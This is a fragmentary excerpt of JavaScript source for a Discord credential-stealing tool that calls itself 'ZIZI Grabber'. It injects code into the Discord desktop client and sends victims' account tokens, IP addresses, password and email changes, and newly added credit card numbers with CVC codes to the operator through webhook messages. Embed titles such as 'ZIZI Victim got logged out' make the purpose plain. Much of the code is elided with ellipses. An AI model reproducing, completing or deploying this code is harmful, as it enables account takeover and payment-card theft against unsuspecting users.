...
if (fs.existsSync(bdPath)) require(bdPath);`;
    ...
    if (!fs.existsSync(path.join(__dirname, "ZIZI"))) return !0;
    execScript(
...
async function FirstTime() {
    ...
    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
        ...
        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "ZIZI"))) {
                fs.rmdirSync(path.join(__dirname, "ZIZI"));
                if (token == null || token == undefined || token == "") {
                    var {
                        ip
                    } = await getIP()
                    const c = {
                        username: "ZIZI Grabber",
                        avatar_url: "",
                        content: "",
                        embeds: [{
                            title: "ZIZI Initalized",
                    ...
                    if(b.avatar === null){
                        usericonurl = "https://raw.githubusercontent.com/Zizidsc/ZIZI-Assets/main/ZIZI%20(2).png"
                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                    if(b.banner === null){
                        bannerurl = "https://raw.githubusercontent.com/Zizidsc/ZIZI-Assets/main/Banner.png"
                    }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                    const c = {
                        username: "ZIZI Grabber",
                        avatar_url: "https://raw.githubusercontent.com/Zizidsc/ZIZI-Assets/main/ZIZI%20(2).png",
                        content: "",
                        embeds: [{
                            title: "ZIZI Initalized",
                            description: "[<a:ZIZIgif:1041634542093619260>  **Oh you have ZIZIed someone**](Zizi)",
                            color: config["embed-color"],
                            fields: [{
                                name: "Injection Info",
                    ...
                    if (config['logout-notify'] == "true") {
                        if (token == null || token == undefined || token == "") {
                            ...
                            const c = {
                                ...
                                content: "",
                                embeds: [{
                                    title: "ZIZIed User log out (User not Logged in before)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
                            ...
                            const c = {
                                ...
                                content: "",
                                embeds: [{
                                    title: "ZIZI Victim got logged out",
                                    description: "[<a:ZIZIgif:1041634542093619260>  **Oh you have ZIZIed someone**](Zizi)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
            ...
            const params = {
                ...
                embeds: [{
                    ...
                    "fields": [{
                        ...
                        name: "@Copyright",
                        value: `[ZIZI 2021 <a:ZIZIgif:1041634542093619260>](Zizi/ZIZI-Grabber)`,
                        inline: !0
												}, {
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            const params = {
                ...
                content: "",
                embeds: [{
                    "title": "ZIZI Detect Password Changed",
                    description: "[<a:ZIZIgif:1041634542093619260>  **Oh you have ZIZIed someone**](Zizi)",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
           ...
           const params = {
                ...
                content: "",
                embeds: [{
                        "title": "ZIZI Detect Email Changed",
                        description: "[<a:ZIZIgif:1041634542093619260>  **Oh you have ZIZIed someone**](Zizi)",
                        "color": config['embed-color'],
                        "fields": [{
                                name: "Injection Info",
...
async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    ...
    var {
        ...
        const params = {
            ...
            content: "",
            embeds: [{
                    "title": "ZIZI User Credit Card Added",
                    "description": `
                    **IP:** ${ip}\n\n
            ...
            },
                {
                    ...
                    "color": config['embed-color'],
                    "description": `\`\`\`diff\n${fs.readFileSync('ZIZIed_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
